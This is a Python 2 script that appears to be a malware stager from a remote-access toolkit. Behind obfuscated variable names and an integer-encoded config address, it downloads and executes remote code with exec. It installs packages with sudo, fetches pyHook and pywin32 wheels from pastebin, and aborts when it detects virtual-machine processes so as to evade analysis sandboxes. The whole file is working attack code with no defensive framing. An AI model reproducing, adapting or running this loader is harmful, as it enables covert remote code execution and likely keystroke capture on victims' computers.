#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import imp
import json
import struct
import base64
import urllib2



def run(*args, **kwargs):
    IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
    SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
    RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
    AccidentalAquaticCactus   = json.loads(urllib2.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
    AccidentalAquaticCactus['settings']['__f__'] = bytes(IncontinentObtuseCucumber(__file__)) if '__file__' in globals() else ''
    GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
    os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
    if not len(GroovySophisticatedLemur):
        exec urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__y__'))).read() in globals()
        exec urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__x__'))).read() in globals()
    else:
        try:
            for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(struct.calcsize('P') * 8)].items():
                if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                    try:
                        RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                    except Exception as e:
                        print 'Error:', str(e)
                    if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                        try:
                            RuthlessSpiffyTablecloth(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                        except Exception as e:
                            print 'Error:', str(e)
                        if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])) and 'pastebin' in NobleRusticWalrus:
                            if 'pyHook' in FoamyNonstopHistory:
                                ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                            elif 'pypiwin32' in FoamyNonstopHistory:
                                ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                            try:
                                with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                    fp.write(base64.b64decode(urllib2.urlopen(NobleRusticWalrus).read()))
                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                            except Exception as e:
                                print 'Error:', str(e)
                            if os.path.isfile(os.path.basename(NobleRusticWalrus)):
                                os.remove(os.path.basename(NobleRusticWalrus))
                        else:
                            print FoamyNonstopHistory, 'loaded'
                            continue
                    else:
                        print FoamyNonstopHistory, 'loaded'
                        continue
                else:
                    print FoamyNonstopHistory, 'loaded'
                    continue
        finally:
            try:
                RoundPluckyScallion = urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__w__'))).read()
                AmbiguousObedientQuestion = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
                TalentedAlcoholicBeetle = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
                PanoramicAbandonedCraftsman = imp.new_module(TalentedAlcoholicBeetle)
                QuarrelsomeImportedAtom = '\n\n'.join([RoundPluckyScallion, urllib2.urlopen(AmbiguousObedientQuestion).read()])
                MajesticMachoOkra = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
                exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
                return PanoramicAbandonedCraftsman.main(**AccidentalAquaticCactus['settings'])
            except Exception as e:
                print 'Error:', str(e)

def main(*args, **kwargs):
    s = 'tasklist' if os.name is 'nt' else 'ps'
    c = 0 if os.name is 'nt' else -1
    if 'checkvm' in kwargs:
        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in (kwargs.get('procs') or ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'])]) if (bool(kwargs.get('checkvm')) if 'checkvm' in kwargs else False) else bool([]):
            print 'aborting...'
            return
    if 'config' in kwargs:
        return run(**kwargs)
    else:
        print "missing argument 'config'"
        return
    

if __name__ == '__main__':
    main(config=5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950)
